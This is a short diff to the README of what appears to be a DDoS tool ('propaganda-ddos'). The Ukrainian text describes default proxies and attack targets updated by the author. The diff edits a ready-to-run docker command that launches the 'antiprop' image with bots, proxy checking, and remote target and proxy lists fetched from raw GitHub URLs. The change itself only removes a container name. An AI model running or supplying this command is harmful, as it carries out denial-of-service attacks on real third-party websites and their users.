@@ -13,7 +13,7 @@
 ### [Проксі та цілі для атаки за замовчуванням (оновлює автор) -- але краще передавайте свої джерела, щоб мати контроль, над тим які проксі та цілі обирати](https://github.com/meddion/propaganda-ddos/tree/sources)
 
 ```bash
-docker run --rm -it --name=antiprop lovefromukraine/antiprop --refresh=20 \
+docker run --rm -it lovefromukraine/antiprop --refresh=20 \
 --dnsres=true --errcount=9 --onlyproxy=false --bots 10 --checkproxy=true \
 --sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
 --proxy https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
